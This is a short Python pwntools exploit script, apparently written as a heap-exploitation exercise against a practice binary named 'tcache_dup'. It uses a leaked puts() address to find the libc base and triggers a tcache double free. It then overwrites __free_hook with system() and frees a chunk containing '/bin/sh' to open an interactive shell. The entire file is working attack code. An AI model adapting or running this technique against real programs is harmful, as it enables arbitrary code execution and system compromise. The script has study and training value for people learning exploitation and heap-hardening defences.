#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("tcache_dup")
libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size & data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send(b"2")
    io.sendafter(b"index: ", f"{index}".encode())
    io.recvuntil(b"> ")

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.recvuntil(b"> ")
io.timeout = 0.1

# =============================================================================

# Request a minimum-sized chunk and write data into it.
chunk_A = malloc(24, b"A"*8)

# Double free
free(chunk_A)
free(chunk_A)

binsh = libc.search(b"/bin/sh\x00").__next__()

chunk_A = malloc(24, p64(libc.sym["__free_hook"]))
binsh = malloc(24, b"/bin/sh\x00")
target = malloc(24, p64(libc.sym["system"]))

free(binsh)

# =============================================================================

io.interactive()
